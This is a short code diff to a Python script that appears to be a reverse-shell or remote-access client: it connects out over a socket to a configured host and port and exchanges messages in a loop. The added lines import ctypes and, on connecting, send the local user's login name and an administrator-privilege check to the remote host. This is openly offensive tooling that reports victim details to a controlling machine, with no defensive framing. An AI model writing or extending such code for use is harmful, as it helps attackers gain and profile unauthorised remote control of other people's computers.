@@ -2,6 +2,7 @@ import socket
 import subprocess
 import os
 import sys
+import ctypes
 
 #Function to Receive Inbound Messages and Return Them to the Session Handler
 def inbound():
@@ -23,6 +24,8 @@ def outbound(message):
 def session_handler():
     print(f'[+] Connecting to {host_ip}')
     sock.connect((host_ip, host_port))
+    outbound(os.getlogin())
+    outbound(ctypes.windll.shell32.IsUserAnAdmin())
     print(f'[+] Connected to {host_ip}')
     while True:
             message = inbound()
